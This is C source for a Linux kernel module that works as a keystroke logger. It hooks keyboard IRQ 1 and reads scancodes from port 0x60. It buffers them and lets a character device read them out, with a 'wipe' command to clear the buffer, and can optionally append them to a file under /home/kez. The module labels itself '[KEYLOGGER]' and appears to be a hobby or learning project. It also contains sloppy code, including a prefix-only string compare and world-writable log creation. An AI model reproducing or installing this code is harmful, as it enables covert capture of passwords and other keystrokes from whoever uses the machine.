#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>

// kbd irq
#include <linux/interrupt.h>
#include <asm/io.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>


bool str_eq(const char* str1, const char* str2, size_t len);

void delete_content(void);

int init_module(void);
void cleanup_module(void);

static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);

#define SUCCESS 0
#define DEVICE_NAME "chardev"
#define BUF_LEN 10000

static int Major;
//static int Device_Open = 0;

// Device part {
static bool is_dev_opened = false;
static char msg[BUF_LEN];
static char *buff_Ptr;
static bool deleted = true;
static bool output_once = true;
static bool do_write_to_file = false;
static int keys_pressed = 0;
static int scancodes_was_read = 0;
// }

// Kbd part {
static char scancode[1];
static char stash[BUF_LEN];
// }

// reverse the given null-terminated string in place
void inplace_reverse(char * str)
{
	if (str)
	{
		char * end = str + strlen(str) - 1;

		// swap the values in the two given variables
		// XXX: fails when a and b refer to same memory location
#   define XOR_SWAP(a,b) do	  \
		{                         \
			a ^= b;                 \
			b ^= a;                 \
			a ^= b;                 \
		} while (0)

		// walk inwards from both ends of the string,
		// swapping until we get to the middle
		while (str < end)
		{
			XOR_SWAP(*str, *end);
			str++;
			end--;
		}
#   undef XOR_SWAP
	}
}

struct file * file_open(const char *path, int flags, int rights)
{
	struct file * filp = NULL;
	mm_segment_t oldfs;
	int err = 0;

	oldfs = get_fs();
	set_fs(get_ds());
	filp = filp_open(path, flags, rights);
	set_fs(oldfs);
	if (IS_ERR(filp)) {
		err = PTR_ERR(filp);
		return NULL;
	}
	return filp;
}

void file_close(struct file * file)
{
	filp_close(file, NULL);
}

int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
{
	mm_segment_t oldfs;
	int ret;

	oldfs = get_fs();
	set_fs(get_ds());

	ret = vfs_read(file, data, size, &offset);

	set_fs(oldfs);
	return ret;
}

int file_write(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
{
	mm_segment_t oldfs;
	int ret;

	oldfs = get_fs();
	set_fs(get_ds());

	ret = vfs_write(file, data, size, &offset);

	set_fs(oldfs);
	return ret;
}

int file_sync(struct file * file)
{
	vfs_fsync(file, 0);
	return 0;
}



// implementation of strcmp
bool str_cmp(const char* str1, const char* str2)
{
	while ( (*(str1) != '\0') && (*(str2) != '\0'))
	{
		//printk(KERN_INFO "chars: %c %c\n", *str1, *str2);
		if (*(str1) != *(str2))
		{
			return false;
		}
		++str1;
		++str2;
	}
	return true;
}


void delete_content(void)
{
	printk(KERN_INFO "Delete contents.\n");
	deleted = true;
}

static struct file_operations fops = {
        .read = device_read,
        .write = device_write,
        .open = device_open,
        .release = device_release };

static irqreturn_t irq_handler(int irq, void * data)
{
	char * sc = (char *)data;
	sc[0] = inb(0x60);

	return IRQ_WAKE_THREAD;
}

static irqreturn_t irq_thread(int irq, void * data)
{
	char * sc = (char *)data;
	char buffer[7];

	if (!(sc[0] & 0x80))
	{
		if (do_write_to_file)
		{
			struct file* outputfile = file_open("/home/kez/log", O_RDWR | O_APPEND | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
			snprintf(buffer, 6, "%#04x ", (unsigned int)(*sc));
			file_write(outputfile, 0, buffer, 5);
			file_close(outputfile);
		}

		stash[keys_pressed] = 0x7f & sc[0];
		keys_pressed = (keys_pressed + 1) % BUF_LEN;
	}

	printk(KERN_ALERT "[KEYLOGGER] Scan Code1 %#x %s\n", sc[0] & 0x7f, sc[0] & 0x80 ? "Released" : "Pressed");

	return IRQ_HANDLED;
}

int init_module(void) {
	Major = register_chrdev(0, DEVICE_NAME, &fops);
	if (Major < 0)
	{
		printk(KERN_ALERT "Registering device failed with %d\n", Major);
		return Major;
	}
	printk(KERN_INFO "Major number - %d\n", Major);
	printk(KERN_INFO "'mknod /dev/%s c %d 0'.\n", DEVICE_NAME, Major);
	printk(KERN_INFO "Try to make 'cat file' and 'echo smth' to read and write\n");
	printk(KERN_INFO "Available commands:\n");
	printk(KERN_INFO "reverse, dir forward, dir backward\n");
	printk(KERN_INFO "use 'rm /dev/%s'.\n\n", DEVICE_NAME);
	// return SUCCESS;

	return request_threaded_irq(1, irq_handler, irq_thread, IRQF_SHARED, "pc105", &scancode);
}

void cleanup_module(void)
{
	// Disable keyboard irq handling
	printk(KERN_ALERT "[KEYLOGGER] Disabling kbd irq handling.\n");
	free_irq(1, &scancode);

	// Disable character device
	printk(KERN_ALERT "[KEYLOGGER] Disabling character device.\n");
	unregister_chrdev(Major, DEVICE_NAME);
}

static int device_open(struct inode *inode, struct file *file)
{
	printk(KERN_ALERT "[KEYLOGGER] Openning device.\n");
	if (is_dev_opened)
	{
		return -EBUSY;
	}

	is_dev_opened = true;
	buff_Ptr = msg;
	try_module_get(THIS_MODULE);

	scancodes_was_read = 0;
	return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file)
{
	printk(KERN_ALERT "[KEYLOGGER] Releasing device.\n");

	is_dev_opened = false;
	module_put(THIS_MODULE);
	return 0;
}

static ssize_t device_read(struct file *filp, char __user * buff, size_t len, loff_t * offset)
{
	int bytes = 0;
	// char c; // unused variable
	// int size = 0; // unused variable

	const int output_buffer_size = 5;
	char buffer[output_buffer_size];
	int i;

	printk(KERN_ALERT "[KEYLOGGER] Reading device.\n");

	if (scancodes_was_read == keys_pressed)
	{
		return 0;
	}

	while (bytes < keys_pressed)
	{
		snprintf(buffer, output_buffer_size + 1, "%#04x ", (unsigned int)(stash[bytes]));
		for (i = 0; i < output_buffer_size; ++i)
		{
			put_user(buffer[i], buff++);
		}
		++bytes;
		++scancodes_was_read;
		--len;
	}

	printk(KERN_INFO "Bytes read: %d\n", bytes - 1);
	return bytes * output_buffer_size;
}

static ssize_t device_write(struct file *filp, const char __user * buff, size_t len, loff_t * offset)
{
	int i;
	char new_msg[BUF_LEN]; // FIXME: Causes 'the frame size of BUF_LEN bytes is larger than 1024 bytes'

	printk(KERN_INFO "Writing to device: [lenght=%d]", (int)(len - 1) );

	for (i = 0; i < len && i < BUF_LEN; i++)
	{
		get_user(new_msg[i], buff + i);
	}

	// TODO: add key: write a key to driver, after that u can read from it
	if (str_cmp(new_msg, "wipe"))
	{
		keys_pressed = 0;
	}
	else
	{
		// do nothing
	}
	return i;
}
